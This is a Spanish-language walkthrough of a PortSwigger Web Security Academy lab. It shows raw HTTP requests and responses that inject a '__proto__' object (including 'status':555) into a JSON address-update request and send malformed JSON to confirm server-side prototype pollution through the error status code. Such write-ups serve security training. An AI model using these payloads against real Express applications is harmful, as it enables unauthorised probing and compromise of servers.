---
description: >-
  https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection
---

# Lab 7: Detecting server-side prototype pollution without polluted property reflection

Primero revisamos el trafico que genera el aplicativo web y se detecta el siguiente request:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Cookie: session=XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu
Content-Length: 168
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu"}
```
{% endcode %}

La peticion previa responde asi:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c5-o6PbsdZgCxd7ROzSod5GR7NXS6Q"
Date: Tue, 25 Jun 2024 20:12:02 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 197

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```
{% endcode %}

Intentamos con el siguiente payload:

```json
POST /my-account/change-address HTTP/2
Host: 0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Cookie: session=XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu
Content-Length: 203
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu","__proto__": {
    "foo":"bar"
}}
```

Pero no funciono o no se reflejo el campo:

{% code overflow="wrap" %}
```json
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"c5-o6PbsdZgCxd7ROzSod5GR7NXS6Q"
Date: Tue, 25 Jun 2024 20:14:19 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 197

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false}
```
{% endcode %}

Y por lo anterior, se intenta generar un error en el servicio quitando una coma:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Cookie: session=XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu
Content-Length: 167
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK""sessionId":"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu"}
```
{% endcode %}

La peticion previa, genero la siguiente respuesta:

{% code overflow="wrap" %}
```json
HTTP/2 500 Internal Server Error
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Etag: W/"129-iMzSuUhACcMNlGkXLgd4T75bkIA"
Date: Tue, 25 Jun 2024 20:16:03 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 297

{"error":{"expose":true,"statusCode":400,"status":400,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"UK\"\"sessionId\":\"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu\"}","type":"entity.parse.failed","foo":"bar"}}
```
{% endcode %}

La respuesta tiene en el body un JSON que incluye varios objetos pero los mas relevantes para nuestra auditoria serian: `"statusCode":400,"status":400`

Teniendo en cuenta lo anterior, enviamos la siguiente peticion:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Cookie: session=XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu
Content-Length: 204
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu","__proto__": {
    "status":555
}}
```
{% endcode %}

La peticion previa incluye `"status":555`.

Luego del envio de esta, se procede a generar un error nuevamente:

{% code overflow="wrap" %}
```json
POST /my-account/change-address HTTP/2
Host: 0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Cookie: session=XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu
Content-Length: 203
Sec-Ch-Ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Accept: */
Origin: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0ac9007b040e97fe817fd97b00f8007d.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK""sessionId":"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu","__proto__": {
    "status":555
}}
```
{% endcode %}

La peticion previa generar un error debido a la ausencia de coma entre country y sessionid.

Y como previamente se habia enviado la peticion correcta con status 555; el aplicativo web responde asi:

{% code overflow="wrap" %}
```json
HTTP/2 500 Internal Server Error
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Etag: W/"156-mZNoTVmgjcskCseuIaWqOOXUzLI"
Date: Tue, 25 Jun 2024 20:16:35 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 342

{"error":{"expose":false,"statusCode":555,"status":555,"body":"{\"address_line_1\":\"Wiener HQ\",\"address_line_2\":\"One Wiener Way\",\"city\":\"Wienerville\",\"postcode\":\"BU1 1RP\",\"country\":\"UK\"\"sessionId\":\"XyCpRGsEtzVuQZYKp7hAeWpXEmruMDCu\",\"__proto__\": {\r\n    \"status\":555\r\n}}","type":"entity.parse.failed","foo":"bar"}}
```
{% endcode %}

Se puede apreciar que `"statusCode":555,"status":555` coinciden con los valores inyectados previamente.
